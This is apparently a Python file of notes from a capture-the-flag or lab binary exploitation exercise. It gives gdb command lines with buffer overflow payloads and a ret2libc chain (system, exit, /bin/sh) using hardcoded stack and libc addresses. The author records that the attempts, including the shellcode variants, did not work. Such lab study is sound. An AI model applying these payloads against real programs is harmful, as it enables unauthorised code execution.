from pwn import *

'''
local exploit:
    r $(python -c 'print "A"*20  + "\xf0\xd3\xff\xff" + "\x88\xd1\xff\xff" + "B"*4')
It will overwrite the *blah pointer and ebp with the next 2 addresses after A payload.
If you'll try just "A"*20, you will receive an address of blah that is pointed to this A string.
But if you supply a string longer than "A" * 20, this address will be moved.
So, you can view it with `x/500s $esp` which will show you all strings in the stack.
Now, you can control flow with the first command.
So, full local exploit with ret2lib attack:
    r $(python -c 'print "A"*20  + "\xe8\xd3\xff\xff" + "\x88\xd1\xff\xff" + "\x40\xb0\xe0\xf7" + "\x90\xd9\xdf\xf7" + "\x3c\x23\xf5\xf7"')
Exploit ret2lib: offset + *blah + old_ebp + system + exit + /bin/sh
Okay, I gave up on this task, I don't know what the matter because I tried all that here you can do.
ret2lib is a useless cause in env exit func with null-byte at the end, but without exit, it doesn't work too.
Placing shellcode into the env variable doesn't work too.
Just jump to shellcode within string after offset and ret address doesn't work too.
'''
